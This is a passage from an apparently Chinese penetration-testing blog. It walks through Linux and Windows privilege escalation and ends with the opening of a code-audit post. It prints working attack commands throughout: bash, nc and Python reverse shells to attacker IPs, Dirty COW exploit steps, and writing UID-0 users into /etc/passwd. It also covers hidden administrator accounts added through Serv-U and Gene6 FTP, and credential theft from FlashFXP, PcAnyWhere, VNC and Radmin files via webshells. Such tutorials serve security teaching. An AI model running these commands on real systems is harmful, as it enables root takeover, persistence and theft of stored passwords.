<p><strong>讲解：</strong>绑定REMOTE主机的CMDSHELL并反向连接到192.168.x.x的TCP5354端口<br>以上为最基本的几种用法（其实NC的用法还有很多，当配合管道命令”|”与重定向命令”&lt;”、”&gt;”等等命令功能更强大……）</p>
<h5 id="2、利用bash直接反弹"><a href="#2、利用bash直接反弹" class="headerlink" title="2、利用bash直接反弹"></a>2、利用bash直接反弹</h5><p><strong>🟪简单介绍一下bash</strong></p>
<blockquote>
<p>Bash，Unix shell的一种，在1987年由布莱恩·福克斯为了GNU计划而编写。1989年发布第一个正式版本，原先是计划用在GNU操作系统上，但能运行于大多数类Unix系统的操作系统之上，包括Linux与Mac OS X v10.4都将它作为默认shell。它支持文件名替换（通配符匹配）、管道、here文档、命令替换、变量，以及条件判断和循环遍历的结构控制语句。</p>
</blockquote>
<p><strong>（1） bash反弹一句话</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.1&#x2F;8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2.本地 nc -l -p 8080</span><br></pre></td></tr></table></figure>

<p><strong>（2）bash一句话命令详解</strong><br>以下针对常用的bash反弹一句话进行了拆分说明，具体内容如下。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> 命令                                命令详解</span><br><span class="line">bash -i                          产生一个bash交互环境</span><br><span class="line">&gt;&amp;                               将联合符号前面的内容与后面的相结合然后一起重定向给后者</span><br><span class="line">&#x2F;dev&#x2F;tcp&#x2F;192.168.31.41&#x2F;8080      linux环境中所有的内容都是以文件的形式存在的，其实大家一看见这个内容就能明白，就是让主机与目标主机192.168.61.41:8080端口建立一个TCP连接。</span><br><span class="line">0&gt;&amp;1                             将标准的输入与标准输出内容相结合，然后重定向给前面标准的输出内容。</span><br></pre></td></tr></table></figure>

<p>其实以上bash反弹一句完整的解读过程就是：<br>bash产生了一个交互环境与本地主机主动发起与目标主机8080端口建立的连接（即TCP 8080 会话连接）相结合，然后在重定向个tcp 8080会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash 反弹环境。</p>
<h4 id="二、脏牛内核提权"><a href="#二、脏牛内核提权" class="headerlink" title="二、脏牛内核提权"></a>二、脏牛内核提权</h4><p><strong>脏牛漏洞：</strong>又叫Dirty COW，存在Linux内核中已经有长达9年的时间，在2007年发布的Linux内核版本中就已经存在此漏洞。Linux kernel团队在2016年10月18日已经对此进行了修复。还有一些其他的内核漏洞提权了。但是内核漏洞提权很难成功，因为内核提权对内核的版本，还有目标机器的环境要求很高(需要安装有gcc等编译环境 )。所以使用内核提权成功率很低。并且内核提权需要查看exp的源代码，不然可能连编译都不会。</p>
<p><strong>漏洞范围：</strong>Linux内核 &gt;= 2.6.22（2007年发行，到2016年10月18日才修复）</p>
<p><strong>简要分析：</strong>该漏洞具体为，Linux内核的内存子系统在处理写入复制（copy-on-write, COW）时产生了竞争条件（race condition）。恶意用户可利用此漏洞，来获取高权限，对只读内存映射进行写访问。竞争条件，指的是任务执行顺序异常，可导致应用崩溃，或令攻击者有机可乘，进一步执行其他代码。利用这一漏洞，攻击者可在其目标系统提升权限，甚至可能获得root权限。</p>
<p>exp：<a href="https://links.jianshu.com/go?to=https://github.com/gbonacini/CVE-2016-5195">https://github.com/gbonacini/CVE-2016-5195</a></p>
<p><strong>利用gcc编译dirty.c文件</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -pthread dirty.c -o dirty -lcrypt</span><br></pre></td></tr></table></figure>

<p><img src="/image/%E6%8F%90%E6%9D%83/3.jpg"></p>
<p><strong>执行当前编译的dirty.c文件</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;dirty</span><br></pre></td></tr></table></figure>

<p><img src="/image/%E6%8F%90%E6%9D%83/4.jpg"></p>
<p><img src="/image/%E6%8F%90%E6%9D%83/5.jpg"></p>
<p><strong>然后su firefart切换到此用户会发现已经是root权限了</strong><br>恢复回去使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rename &#x2F;tmp&#x2F;</span><br></pre></td></tr></table></figure>

<h4 id="三、SUID提权"><a href="#三、SUID提权" class="headerlink" title="三、SUID提权"></a>三、SUID提权</h4><p><strong>简单介绍一下概念</strong></p>
<blockquote>
<p>SUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。</p>
</blockquote>
<p><strong>什么是SUID提权？</strong></p>
<blockquote>
<p>那么什么是suid提权呢？我理解的就是有个文件，它有s标志，并且他输入root，那么我们运行这个程序就可以有了root的权限，并且这个程序还得能执行命令，不然没什么用处，那么我们就能从普通用户提升到了root权限了。</p>
</blockquote>
<p>首先在本地查找符合条件的文件，有以下三个命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#以下命令将尝试查找具有root权限的SUID的文件，不同系统适用于不同的命令，一个一个试</span><br><span class="line">find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">find &#x2F; -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure>

<p>已知的可用来提权的linux可行性的文件列表如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap</span><br><span class="line">vim</span><br><span class="line">find</span><br><span class="line">bash</span><br><span class="line">more</span><br><span class="line">less</span><br><span class="line">nano</span><br><span class="line">cp</span><br></pre></td></tr></table></figure>

<h5 id="利用find文件提权"><a href="#利用find文件提权" class="headerlink" title="利用find文件提权"></a>利用find文件提权</h5><p>假如我们现在拿到了一个网站服务器的shell，但是权限是ubuntu，我们现在需要提权到 root 用户权限。</p>
<p><img src="/image/%E6%8F%90%E6%9D%83/6.jpg"></p>
<p>我们查看具有root用户权限的SUID文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>

<p><img src="/image/%E6%8F%90%E6%9D%83/7.jpg"></p>
<p>我们随便找一个命令进行利用，我们就找find，先查看其信息，发现其确实是root用户权限的SUID的文件</p>
<p><img src="/image/%E6%8F%90%E6%9D%83/8.jpg"></p>
<p>我们先看一下是否能用find命令以root权限运行，发现确实可以以root权限运行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;usr&#x2F;bin&#x2F;find examples.desktop -exec whoami \;</span><br></pre></td></tr></table></figure>

<p><img src="/image/%E6%8F%90%E6%9D%83/9.jpg"></p>
<p>然后我们查看目标网站上是否有python环境，可以看到有python2.7.6的环境</p>
<p>于是我们以root用户的身份利用python反弹shell，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.10.25&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;  #反弹一个sh类型的shell</span><br></pre></td></tr></table></figure>

<p><img src="/image/%E6%8F%90%E6%9D%83/10.jpg"></p>
<p>可以看到，在攻击端收到了反弹过来的shell，并且是root身份</p>
<p><img src="/image/%E6%8F%90%E6%9D%83/11.jpg"></p>
<p><strong>本节来自谢公子的博客：</strong><a href="https://links.jianshu.com/go?to=https://blog.csdn.net/qq_36119192/article/details/84872644">https://blog.csdn.net/qq_36119192/article/details/84872644</a></p>
<h4 id="四、Linux配置错误提权"><a href="#四、Linux配置错误提权" class="headerlink" title="四、Linux配置错误提权"></a>四、Linux配置错误提权</h4><p>还有就是利用Linux的配置文件错误，导致 /etc/passwd 文件可写入提权：</p>
<p>对Linux配置进行检查的脚本有：<br><a href="https://links.jianshu.com/go?to=https://www.securitysift.com/download/linuxprivchecker.py">https://www.securitysift.com/download/linuxprivchecker.py</a><br><a href="https://links.jianshu.com/go?to=http://pentestmonkey.net/tools/audit/unix-privesc-check">http://pentestmonkey.net/tools/audit/unix-privesc-check</a></p>
<p>当我们获得了某个Linux服务器的低权限之后，我们想要对该低权限账号进行提权，以执行更多的操作。<br>接下来我们的提权是利用 /etc/passwd 文件的可写入权限，导致我们写入一个其他用户进去。<br>首先，查看 /etc/passwd 的权限，发现任何用户都可以读写。</p>
<p><img src="/image/%E6%8F%90%E6%9D%83/12.jpg"></p>
<p>我们现在要做的就是自己构造一个用户，在密码占位符处指定密码，并且UID设置为0，将其添加到 /etc/passwd 文件中。</p>
<p>首先，使用perl语言生成带有盐值的密码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">perl -le &#39;print crypt(&quot;password@123&quot;,&quot;addedsalt&quot;)&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/image/%E6%8F%90%E6%9D%83/13.jpg"></p>
<p>然后执行下面这条命令，成功将test用户的信息加入 /etc/passwd 文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;test:advwtv&#x2F;9yU5yQ:0:0:User_like_root:&#x2F;root:&#x2F;bin&#x2F;bash&quot; &gt;&gt;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>

<p><img src="/image/%E6%8F%90%E6%9D%83/14.jpg"></p>
<p>以用户名：test 密码： password@123 登录主机，登录成功后，是 root 权限。</p>
<p><img src="/image/%E6%8F%90%E6%9D%83/15.jpg"></p>
<p>以下这条命令直接生成一个具有root权限的用户：venus，密码为：123qwe 。前提是这条命令的执行需要root权限。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">useradd -p &#96;openssl passwd -1 -salt &#39;user&#39; 123qwe&#96; -u 0 -o -g root  -G root -s &#x2F;bin&#x2F;bash -d &#x2F;home&#x2F;user venus</span><br></pre></td></tr></table></figure>

<p>本章来自于谢公子的博客：<a href="https://links.jianshu.com/go?to=https://blog.csdn.net/qq_36119192/article/details/99871667">https://blog.csdn.net/qq_36119192/article/details/99871667</a></p>
<h4 id="五、定时任务提权"><a href="#五、定时任务提权" class="headerlink" title="五、定时任务提权"></a>五、定时任务提权</h4><p>系统内可能会有一些定时执行的任务，一般这些任务由crontab来管理，具有所属用户的权限。非root权限的用户是不可以列出root 用户的计划任务的。但是 /etc/ 内系统的计划任务可以被列出。默认这些程序以root权限执行，如果有幸遇到一个把其中脚本配置成任意用户可写，我们就可以修改脚本进行提权了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ls -l &#x2F;etc&#x2F;cron*</span><br></pre></td></tr></table></figure>

<p>使用该命令，列出的文件，查看 /etc/cron.daily 、/etc/cron.hourly、/etc/cron.monthly、/etc/cron.weekly 这四个文件夹内的文件，查看是否允许其他用户修改。如果 允许任意用户修改，那么我们就可以往这些文件里面写入反弹shell的脚本提权了。</p>
<p><img src="/image/%E6%8F%90%E6%9D%83/16.jpg"></p>
<h4 id="六、密码复用提权"><a href="#六、密码复用提权" class="headerlink" title="六、密码复用提权"></a>六、密码复用提权</h4><p>我们如果在主机上找到了其他应用或数据库的密码，那么很有可能root用户也用该密码。那么就可以尝试一下 su root 来提权了。</p>
<h4 id="七、ReDuh内网端口转发"><a href="#七、ReDuh内网端口转发" class="headerlink" title="七、ReDuh内网端口转发"></a>七、ReDuh内网端口转发</h4><p>ReDuh是可以把内网服务器的端口通过http或https隧道转发到本机，形成一个TCP连通回路，用于目标服务器在内网或做了端口策略的情况下连接目标服务器内部端口的工具。</p>
<p>详细介绍:<a href="https://links.jianshu.com/go?to=http://www.cnblogs.com/huhu0013/p/4567319.html">http://www.cnblogs.com/huhu0013/p/4567319.html</a></p>
<h4 id="八、内网渗透神器ReGeorg"><a href="#八、内网渗透神器ReGeorg" class="headerlink" title="八、内网渗透神器ReGeorg"></a>八、内网渗透神器ReGeorg</h4><p>ReGeorg是ReDuh的继承者。主要是把内网服务器的端口通过http/https隧道转发到本机，形成一个回路。用于目标服务器在内网或做了端口策略的情况下连接目标服务器内部开放端口。</p>
<p>详细介绍:<a href="https://links.jianshu.com/go?to=http://iscc.gxu.edu.cn/index.php/News/show/id/34">http://iscc.gxu.edu.cn/index.php/News/show/id/34</a></p>
<h1 id="第三方软件-提权"><a href="#第三方软件-提权" class="headerlink" title="第三方软件 提权"></a>第三方软件 提权</h1><p><strong>Serv-U FTP Server，是一种被广泛运用的FTP服务器端软件，支持3x/9x/ME/NT/2K等全Windows系列。可以设定多个FTP服务器、限定登录用户的权限、登录主目录及空间大小等</strong></p>
<h2 id="Serv-U提权分两种"><a href="#Serv-U提权分两种" class="headerlink" title="Serv-U提权分两种"></a>Serv-U提权分两种</h2><p><strong>1.有修改权限</strong></p>
<p><strong>2.无权限修改</strong></p>
<h3 id="有修改权限"><a href="#有修改权限" class="headerlink" title="有修改权限"></a>有修改权限</h3><p><strong>0.判断是否安装serv-u</strong></p>
<p>serv-u的默认端口是43958  可以用nmap 扫描确认</p>
<p><strong>1.检查是否有可写权限</strong></p>
<h4 id="1、通过修改配置文件提权"><a href="#1、通过修改配置文件提权" class="headerlink" title="1、通过修改配置文件提权"></a>1、通过修改配置文件提权</h4><blockquote>
<p>首先找配置文件<br>一般安装目录 c:\Program Files\Serv-u\SerUDaemon.ini</p>
</blockquote>
<p><img src="/image/%E6%8F%90%E6%9D%83/17.jpg"></p>
<blockquote>
<p>修改配置文件，最后提交，成功添加一个新用户，有权限的系统管理员<br>复制一个 修改名字<br>password 密码格式 是  gw+md5     我从<a href="https://links.jianshu.com/go?to=https://www.cmd5.com/">https://www.cmd5.com/</a>   把gw123456  加密  注意gw是他的 属于密码规则<br>把加密完的密码去替换复制的密码  password=gw+md5(gw123456)<br>maintenance=system   是代表系统权限  user=你命名的用户</p>
</blockquote>
<p><img src="/image/%E6%8F%90%E6%9D%83/18.jpg"></p>
<p><img src="/image/%E6%8F%90%E6%9D%83/19.jpg"></p>
<blockquote>
<p>找到安装目录，将文件添加一个有修改权限</p>
<p><img src="/image/%E6%8F%90%E6%9D%83/20.jpg"></p>
</blockquote>
<blockquote>
<p>成功添加系统管理员</p>
</blockquote>
<p><img src="/image/%E6%8F%90%E6%9D%83/21.jpg"></p>
<p>密码用cmd5解密，=后面两位不用管，直接解密后面就ok</p>
<p>成功添加用户后，我们可以通过工具FlashFXP进行连接</p>
<p><img src="/image/%E6%8F%90%E6%9D%83/22.jpg"></p>
<p>也可以用cmd.exe连接</p>
<p><img src="/image/%E6%8F%90%E6%9D%83/23.jpg"></p>
<p>cmd访问 ftp 连接  ip  输入你刚刚添加的用户密码</p>
<p>输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">quote site exec net user username password &#x2F;add</span><br><span class="line"></span><br><span class="line">quote site exec net localgroup administrators username &#x2F;add  </span><br></pre></td></tr></table></figure>

<p><strong>利用ftp命令quote site exec 添加用户 加入administrators 权限组</strong></p>
<p>打开3389连接</p>
<h3 id="无修改权限"><a href="#无修改权限" class="headerlink" title="无修改权限"></a><strong>无修改权限</strong></h3><p>1.利用md5 直接去解密（ini 文件密码在ftp连）</p>
<p>2.默认密码，默认用户</p>
<p><img src="/image/%E6%8F%90%E6%9D%83/24.jpg"></p>
<p>账户：LocalAdministrator ，密码：#l@$ak#.lk;0@P</p>
<p>命令cmd /c net user DisKill /add &amp; net localgroup administrators DisKill /add</p>
<p><img src="/image/%E6%8F%90%E6%9D%83/25.jpg"></p>
<p>添加了一个隐藏用户查看方法net user tls$</p>
<p>3.不是默认密码时 直接把SerUAdmin.exe 下载下来 进行查看密码</p>
<p><img src="/image/%E6%8F%90%E6%9D%83/26.jpg"></p>
<p><img src="/image/%E6%8F%90%E6%9D%83/27.jpg"></p>
<p>记住这里选an字符串</p>
<p><img src="/image/%E6%8F%90%E6%9D%83/28.jpg"></p>
<p>. 后面就是密码  把它替换到</p>
<p><img src="/image/%E6%8F%90%E6%9D%83/29.jpg"></p>
<p>这也叫溢出提权</p>
<h2 id="FlashFXP-替换文件漏洞提权"><a href="#FlashFXP-替换文件漏洞提权" class="headerlink" title="FlashFXP 替换文件漏洞提权"></a>FlashFXP 替换文件漏洞提权</h2><h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><blockquote>
<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p><strong>FlashFXP</strong>是一个功能强大的 FXP/<a href="https://links.jianshu.com/go?to=https://www.cr173.com/k/FlashFxp/">FTP</a> 软件，融合了一些其他优秀 FTP软件的优点，如像 CuteFTP 一样可以比较文件夹，支持彩色文字显示；像 BpFTP 支持多文件夹选择文件，能够缓存文件夹；像 LeapFTP 一样的外观界面，甚至设计思路也差相仿佛。支持上传、下载及第三方文件续传；可以跳过指定的文件类型，只传送 需要的文件；可以自定义不同文件类型的显示颜色；可以缓存远端文件夹列表，支持FTP代理及 Socks 3&amp;4；具有避免空闲功能，防止被站点踢出</p>
<h3 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h3><p><strong>FlashFXP可用于：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">• 发布和维护你的网站。</span><br><span class="line">• 上传和下载文件，照片，视频，音乐和更多！</span><br><span class="line">• 本地和远程文件传输或备份。</span><br><span class="line">• 共享您的文件与您的朋友和同事使用功能强大的站点管理器。</span><br><span class="line">• 我们强大的传输调度安排和自动化文件传输。</span><br></pre></td></tr></table></figure>

<h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1） 基于官方便携安装版破解打包，去后续检测更新提示</span><br><span class="line"></span><br><span class="line">2） 集成密钥文件，启动即为已授权版</span><br><span class="line"></span><br><span class="line">3） 禁止联网验证注册信息，后续不反弹</span><br><span class="line"></span><br><span class="line">4） 补充汉化翻译了官方简体中文语言，默认启动为中文，删多语言、帮助文档 4.x</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>**FlashFXP 中的“FXP” 是什么意思? **</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FXP是指在两台服务之间的直线传输。也可以称为“站到站传输”(Site to Site Transfers)。</span><br><span class="line"></span><br><span class="line">**注：**FXP过程需要服务两台服务器均支持方可进行。它利用服务器之间的高速连接，实现文件的高效传输，几乎不会占用本机的带宽资源。</span><br></pre></td></tr></table></figure>

<p><strong>FlashFXP 的不足?</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FlashFXP 无法像CuteFTP那样实现的多窗功能，CuteFTP 可在一个窗口中打开多个站点。此外，FlashFXP 尚不支持多进程传输，所有的下载和上传任务均是以单线程进行。</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="0x02-环境配置"><a href="#0x02-环境配置" class="headerlink" title="0x02 环境配置"></a>0x02 环境配置</h3><blockquote>
<p><strong>操作系统</strong>：windows 2003 企业版</p>
<p><strong>FTP服务：</strong>使用serv-u服务器，常规提权方法均失效</p>
<p><strong>权限情况：</strong>其他常规方法都无法提权</p>
<p><strong>使用工具：</strong>ASP、. NET版本Shell一个</p>
</blockquote>
<h3 id="0x03-FlashFXP-提权思维导图"><a href="#0x03-FlashFXP-提权思维导图" class="headerlink" title="0x03 FlashFXP 提权思维导图"></a>0x03 FlashFXP 提权思维导图</h3><p><strong>提权思路：</strong>利用FlashFXP替换文件漏洞，可以读取管理员链接过的站点账号密码。</p>
<p><strong>思路扩展：</strong>通过社会工程学猜测其他的密码同样如此,借此机会扩大权限</p>
<p><img src="/image/%E6%8F%90%E6%9D%83/30.jpg"></p>
<h3 id="0x04-操作演示"><a href="#0x04-操作演示" class="headerlink" title="0x04 操作演示"></a>0x04 操作演示</h3><p>**1. **首先获取WebShell，我们可以利用大马或菜刀，将quick.dat下载下来（因为链接的账号密码都保存在quick.dat这个文件中）</p>
<p><strong>注：</strong>falshfxp默认安装目录：C:\Program Files\flashfxp</p>
<p><img src="/image/%E6%8F%90%E6%9D%83/31.jpg"></p>
<p>**2. **接下来打开我们拿到的webshell,下载quick.dat这个文件，下载后，打开我们本机的FlashFTP把原先的文件提换掉，打开本机软件，查看历史记录，可以看到受害者主机quick.dat 文件里的服务器、用户名、密码等信息，如果想要获取密码，可下载星号密码查看工具查看暗文。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">**星号密码查看工具地址：**[https:&#x2F;&#x2F;www.arpun.com&#x2F;soft&#x2F;8153.html](https:&#x2F;&#x2F;www.arpun.com&#x2F;soft&#x2F;8153.html)</span><br><span class="line"></span><br><span class="line">参考链接：</span><br><span class="line"></span><br><span class="line">               [http:&#x2F;&#x2F;m.mamicode.com&#x2F;info-detail-1385885.html](http:&#x2F;&#x2F;m.mamicode.com&#x2F;info-detail-1385885.html)</span><br><span class="line"></span><br><span class="line">               [https:&#x2F;&#x2F;www.docin.com&#x2F;p-434258776.html](https:&#x2F;&#x2F;www.docin.com&#x2F;p-434258776.html)</span><br></pre></td></tr></table></figure>

<h2 id="Gene6-FTP提权"><a href="#Gene6-FTP提权" class="headerlink" title="Gene6 FTP提权"></a>Gene6 FTP提权</h2><blockquote>
<p>Gene6 FTP Server这个FTP软件简略易用,比SU的保险性高的多.<br>他的默认管理端口是<strong>8021</strong>,只容许本机盘算机连接.外部计算机即便你得到管理帐,你也不能登陆进去.<br>这一点和我们的SU一样,SU的管理端口是<strong>43958</strong>.<br>Gene6 FTP Server的帐户配置文件在:C:\Program Files\Gene6 FTP Server\RemoteAdmin\Remote.ini;在配置文件中找到md5加密的密码</p>
</blockquote>
<blockquote>
<p>那么我们只能通过webshell上传lcx.exe 把端口转发，如：lcx.exe –tran 600 127.0.0.1 8021  接通过另外一台机器安装一个gene6远程连接600端口创建一个域再创建一个有权限的帐号,注意Gene6可单独定义SITE命令调用执行文件文件可以通过webshell上传<br>上传为这样还不能提权.这里到了我们最核心的一步.<br>1.写一个能执行命令的批处理文件,并上传到目标主机.<br>@echo off<br>net user hack hack /add<br>net localgroup administrators hack /add<br>2.然后在SITE COMMANDS那个地方再进行配置.<br>COMMAND那输入你的命令执行的名字.我写的是HACK DESCRIPTTION这个是写描述的.这里随便你写什么都可以的.<br>EXECUTE这里输入你的BAT的命令执行文件的路径.也就是你刚上传的那个文件的路径.点OK就可以了.现在我们来看下我们本地的帐号情况.<br>只有两个帐号.<br>现在我们登陆FTP进行提权操作.输入提权命令 .</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">quote site hack</span><br></pre></td></tr></table></figure>

<p>200 Command executed 命令成功执我们来看下加上帐号没有.<br>已经多了一个HACK的帐号,权限为管理权限.提升权限已经成功.，通过quote site exec 执行就行</p>
<h2 id="PCanyWhere提权"><a href="#PCanyWhere提权" class="headerlink" title="PCanyWhere提权"></a>PCanyWhere提权</h2><h3 id="PCAnyWhere简介"><a href="#PCAnyWhere简介" class="headerlink" title="PCAnyWhere简介"></a>PCAnyWhere简介</h3><p>PcAnyWhere是一款远程控制软件，它出现的目的是为了方便网管人员管理服务器。安装之后默认监听5631端口。它可以将电脑当成主控端去控制远方的另外一台同样安装有PcAnyWhere的电脑（被控端），实现互传文件，内建FIPS 140-2验证AES 256位元加密，可以确保阶段作业的安全性。</p>
<h3 id="提权原理"><a href="#提权原理" class="headerlink" title="提权原理"></a>提权原理</h3><p>PcAnyWhere提权的原理是PcAnyWhere在建立被控端后，会在服务器上产生一个配置文件“pca.***.cif”，这个文件所在的目录并非在安装目录中，而是在“C:\Document and Settings\All Users\Application Data\Symantec\pcAnywhere\Hosts”中。</p>
<p>在配置文件中保存着加密后的链接账户信息，当攻击者下载到这个文件之后，就可以对这个文件进行解密，之后即可获得用户名与密码，之后再使用本地的PcAnyWhere进行登录链接即可获得远程控制。</p>
<h3 id="提权操作演示"><a href="#提权操作演示" class="headerlink" title="提权操作演示"></a>提权操作演示</h3><h4 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h4><p>首先下载PcAnyWhere到本地，之后分别在靶机（Windows Server 2003 R2）、攻击主机Windows XP 中进行安装，之后再Windows Server 2003 R2中建立被控制端程序，设置用户名：hps  密码：*<strong><strong>****</strong></strong>,之后我们可以发现在“C:\Document and Settings\All Users\Application Data\Symantec\pcAnywhere\Hosts”中</p>
<p>存在一个用于记录该用户的文件：</p>
<p><img src="/image/%E6%8F%90%E6%9D%83/32.jpg"></p>
<p>我们最终的目的就是通过在Windows Server 2003 R2上的WEBshell来下载该文件到攻击主机上，之后再进行破解，最后再使用攻击主机上的PcAnyWhere进行连接！下面进行具体操作！</p>
<p><strong>在Windows XP中使用菜刀连接一句话木马</strong></p>
<p><img src="/image/%E6%8F%90%E6%9D%83/33.jpg"></p>
<p>之后进入C:\Document and Settings\All Users\Application Data\Symantec\pcAnywhere\Hosts\下，下载文件</p>
<p><img src="/image/%E6%8F%90%E6%9D%83/34.jpg"></p>
<p>之后可以使用明小子、通天门来对该文件进行解密，获得最后的用户名与密码，之后在本地创建PcAnyWhere的控制端进行连接即可！</p>
<p><img src="/image/%E6%8F%90%E6%9D%83/35.jpg"></p>
<p><img src="/image/%E6%8F%90%E6%9D%83/36.jpg"></p>
<p>实现远控，提权！</p>
<p><img src="/image/%E6%8F%90%E6%9D%83/37.jpg"></p>
<h2 id="VNC提权"><a href="#VNC提权" class="headerlink" title="VNC提权"></a>VNC提权</h2><p>VNC(Virtual Network Computing，虚拟网络计算）是一套由英国剑桥大学AT&amp;T实验<br>室在2002年开发的轻量型跨平台远程<br>控制计算机软件<br>“vnc的默认端口是5901使用端口扫描如果有便安装了vnc</p>
<p><img src="/image/%E6%8F%90%E6%9D%83/38.jpg"></p>
<p>我们在实验时安装服务端就可</p>
<p>我们可以通过脚本大马读注册表获取密码如果不行利用菜刀上传一个cmd.exe到有读写权限的目录然后setp c:\路径…\cmd.exe #切换至上传的cmd来执行命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Cmd&#x2F;c&quot;regedit&#x2F;ec:\123.reg&quot;HKEY_LOCAL_MACHINE\software\RealVNC\WinVNC4&quot; &quot;</span><br></pre></td></tr></table></figure>

<p>获取的密码<br>将得出的十进制数去掉第一个数其他转换成16进制<br>破解16进制数得到密码<br>vncx.exe -W 回车<br>输入16进制数<br>连接vnc<br>读取</p>
<p><img src="/image/%E6%8F%90%E6%9D%83/39.jpg"></p>
<p>vncx4.exe -w 8个数 自动破解密码</p>
<p>然后使用我们vnc工具连接</p>
<h2 id="Radmin提权"><a href="#Radmin提权" class="headerlink" title="Radmin提权"></a>Radmin提权</h2><p>一款远控工具</p>
<p>端口扫描 4899 端口</p>
<p>上传 radmin.asp 木马读取 radmin的加密密文</p>
<p>下载radmin工具连接<br>或者<br>Radmin安装方法直接把server.exe 和admdll.dll放在vm里面，cmd下运行server.exe /setup  设置密码及输入注册信息就ok了；安装完之后可以通过C:&gt;cmd /c “regedit /e c:\123.reg “HKEY_LOCAL_MACHINE\system\RAdmin\v2.0\Server<br>Parameters””导出hash值，再通过hash版Radmin连接就可以</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd&#x2F;c&quot;regedit&#x2F;ed:\IFEO.reg&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options&quot;&quot; </span><br><span class="line">cmd&#x2F;c&quot;regedit&#x2F;ed:\123.reg&quot;HKEY_LOCAL_MACHINE\system\RAdmin\v2.0\Server\Parameters&quot;&quot;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>代码审计</title>
    <url>/2019/08/10/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<h1 id="🎃源代码审计分类"><a href="#🎃源代码审计分类" class="headerlink" title="🎃源代码审计分类"></a>🎃源代码审计分类</h1><blockquote>
<p>白盒：拥有源代码进行审计</p>
<p>黑盒：不知道源代码的情况下进行渗透审计</p>
<p>灰盒：介于黑盒与白盒之间</p>
</blockquote>
<h1 id="🧨审计方法总结"><a href="#🧨审计方法总结" class="headerlink" title="🧨审计方法总结"></a>🧨审计方法总结</h1><blockquote>
<p>主要代码审计方法是跟踪用户输入数据和敏感函数参数回溯：</p>
<p>跟踪用户的输入数据，判断数据进入的每一个代码逻辑是否有可利用的点，此处的代码逻辑</p>
<p>可以是一个函数，或者是条小小的条件判断语句。</p>
<p>敏感函数参数回溯，根据敏感函数，逆向追踪参数传递的过程。这个方法是最高效，最常用</p>
<p>的方法。大多数漏洞的产生是因为函数的使用不当导致的，只要找到这些函数，就能够快速挖掘想要的漏洞。</p>
</blockquote>
<hr>
<h1 id="🧨代码安全测试方法"><a href="#🧨代码安全测试方法" class="headerlink" title="🧨代码安全测试方法"></a>🧨代码安全测试方法</h1><blockquote>
<p>代码审核采用人工审核和静态分析工具辅助的方式进行。</p>
<p>  人工审核：既能解决内部问题也能解决外部问题。这也是目前最有效率的解决方案，并且在理论上手工代码审核是非常有效的，但人工审核的效率不高，所以我们会采用自动化分析工具辅助人工的方式来提高审核效率。</p>
<p>   静态分析工具：通过一组全面规则、测试机制和方针在软件开发过程、测试中发现软件的安全缺陷。</p>
<p>1，fortify</p>
<p>​    2，seay源代码审计 </p>
</blockquote>
<hr>
